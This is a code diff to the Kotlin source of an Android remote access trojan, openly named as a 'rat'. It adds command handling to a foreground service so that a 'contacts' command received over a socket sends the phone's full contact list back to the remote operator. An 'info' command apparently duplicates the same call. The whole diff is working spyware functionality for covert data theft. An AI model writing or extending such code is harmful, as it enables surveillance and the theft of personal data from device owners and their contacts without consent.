@@ -5,6 +5,7 @@ import android.app.Notification
 import android.content.Intent
 import android.util.Log
 import androidx.core.app.JobIntentService
+import ru.awawa.rat.helper.ContactsHelper
 import ru.awawa.rat.helper.toHexString
 import java.net.InetSocketAddress
 import java.net.Socket
@@ -37,6 +38,18 @@ class RatForegroundService: IntentService("RatForegroundService") {
         running = true
         while (running) {
             val packet = socket.getInputStream().readBytes()
+            if (packet.isNotEmpty()) {
+                val command = packet.decodeToString()
+                if (command.startsWith("contacts")) {
+                    socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
+                    return
+                }
+                if (command.startsWith("info")) {
+                    socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
+                    return
+                }
+                Log.e(TAG, "${packet.decodeToString()}")
+            }
             Log.e(TAG, "Read ${packet.toHexString()}")
         }
         stopForeground(true)
